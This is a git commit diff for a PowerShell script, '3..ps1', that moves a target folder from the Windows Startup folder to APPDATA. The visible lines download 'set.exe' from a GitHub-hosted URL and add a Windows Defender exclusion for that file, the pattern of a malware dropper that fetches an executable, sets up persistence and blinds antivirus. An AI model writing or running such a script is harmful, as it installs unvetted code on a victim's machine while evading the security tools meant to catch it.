108e381eacd02407205467c6af5cd6a07fb8b3d6
FCsab <161705557+FCsab@users.noreply.github.com>
2025-03-10 12:48:38 +0100

    Update 3..ps1

--- 3..ps1
+++ 3..ps1
@@ -1,4 +1,4 @@
-$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+$startupFolder = $env:APPDATA
 $url = "https://github.com/FCsab/FCsab.github.io/blob/main/set.exe?raw=true"
 $outputPath = Join-Path $startupFolder "set.exe"
 Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\set.exe"
